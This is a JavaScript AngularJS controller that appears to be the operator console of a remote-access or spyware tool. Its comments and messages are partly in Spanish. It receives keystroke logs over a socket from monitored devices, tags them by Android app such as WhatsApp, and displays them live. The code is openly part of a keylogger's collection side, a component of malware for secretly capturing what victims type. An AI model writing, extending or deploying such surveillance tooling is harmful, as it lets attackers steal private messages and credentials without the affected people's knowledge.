//-----------------------Keylogger Controller (keylogger.html)------------------------
app.controller("KeyloggerCtrl", function($scope, $rootScope) {
    $klCtrl = $scope;
    var klOrder = CONSTANTS.orders.keylogger;
    $klCtrl.keylogs = [];

    $klCtrl.$on('$destroy', () => {
        socket.removeAllListeners(klOrder);
    });

    $klCtrl.clearLogs = () => {
        $klCtrl.keylogs = [];
    }

    $rootScope.Log('Iniciando escucha del Keylogger...');

    socket.on(klOrder, (data) => {
        if (data.log) {
            // Parse log like "[com.whatsapp] [text]" or "ABRIO APP: com.whatsapp"
            var raw = data.log;
            var app = "System";
            var text = raw;

            // Simple parser
            if (raw.startsWith("[")) {
                var match = raw.match(/\[(.*?)\] (.*)/);
                if (match) {
                    app = match[1];
                    text = match[2];
                }
            } else if (raw.startsWith("ABRIO APP: ")) {
                app = "Sistema";
                text = raw;
            }

            $klCtrl.keylogs.push({
                time: new Date().toLocaleTimeString(),
                app: app,
                text: text
            });

            // Scroll to bottom
            var container = document.getElementById("keylog-container");
            if (container) {
                setTimeout(() => {
                    container.scrollTop = container.scrollHeight;
                }, 100);
            }

            $klCtrl.$apply();
        }
    });

});
